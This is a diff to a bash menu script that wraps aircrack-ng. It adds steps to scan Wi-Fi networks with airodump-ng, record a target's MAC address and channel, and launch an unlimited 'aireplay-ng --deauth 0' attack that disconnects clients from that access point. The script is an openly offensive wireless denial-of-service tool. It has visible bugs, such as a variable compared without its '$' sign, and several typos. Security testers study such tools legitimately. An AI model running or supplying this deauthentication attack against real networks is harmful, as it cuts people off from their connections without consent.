@@ -53,12 +53,32 @@ if [[ $(whoami) == 'root' ]]; then
                         break
                     fi
                 done;;
-            2) 
+            2)
                 printf "! Make sure your network card is in monitor mode !\n  Your selected network interface is $(cat data/interface.dat)" | boxes -d stone
                 sleep 4
                 printf "\n airodump-ng starting..."
                 sleep 1
                 airodump-ng $(cat data/interface.dat)
+                echo "If you have chosen a target, you can write this data"
+                printf "\n Target Mac Addres: "
+                read target_mac && echo $target_mac > data/target_mac.dat
+                printf "\n Target Channel: "
+                read target_ch && echo $target_ch > data/target_ch.dat
+            ;;
+            3)
+                printf "
+            Interface: $(cat data/interface.dat)
+            Netrwok Target
+                |- Mac Addres: $(cat data/target_mac.dat)
+                |- Channel: $(cat data/target_ch.dat)
+            
+"
+            printf "\n Everything is okay?: (y/n) "
+            read checker
+            if [[ checker == "y" ]]; then
+                aireplay-ng --deauth 0 -a $(cat data/target_mac.dat) $(cat data/interface.dat)
+            fi
+                sleep 4
             ;;
             'exit')
             break;;
